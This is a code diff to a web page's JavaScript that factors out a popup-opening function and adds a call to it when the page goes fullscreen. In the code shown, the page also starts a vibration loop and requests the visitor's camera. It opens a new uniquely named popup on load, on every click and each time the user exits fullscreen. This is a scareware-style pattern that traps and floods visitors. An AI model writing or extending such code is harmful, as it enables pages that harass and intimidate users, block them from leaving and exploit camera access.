@@ -299,8 +299,16 @@
             fullscreenContent.style.backgroundImage = `url(${capturedImage})`;
         }
 
+        function openDefaultPopup() {
+            window.open('popup.html', 'popup_' + Date.now(), 'width=350,height=350,resizable=no,scrollbars=no,toolbar=no');
+        }
+
         async function triggerFullScreen() {
             startVibrationLoop();
+
+            if (!isMobileDevice) {
+                openDefaultPopup();
+            }
 
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ 
@@ -337,14 +345,14 @@
 
         fullscreenContent.addEventListener('click', function() {
             if (!isMobileDevice) {
-                window.open('popup.html', 'popup_' + Date.now(), 'width=350,height=350,resizable=no,scrollbars=no,toolbar=no');
+                openDefaultPopup();
             }
         });
         
         document.addEventListener('fullscreenchange', function() {
             if (!document.fullscreenElement && fullscreenContent.style.display === 'block') {
                 if (!isMobileDevice) {
-                    window.open('popup.html', 'popup_' + Date.now(), 'width=350,height=350,resizable=no,scrollbars=no,toolbar=no');
+                    openDefaultPopup();
                 }
             }
         });
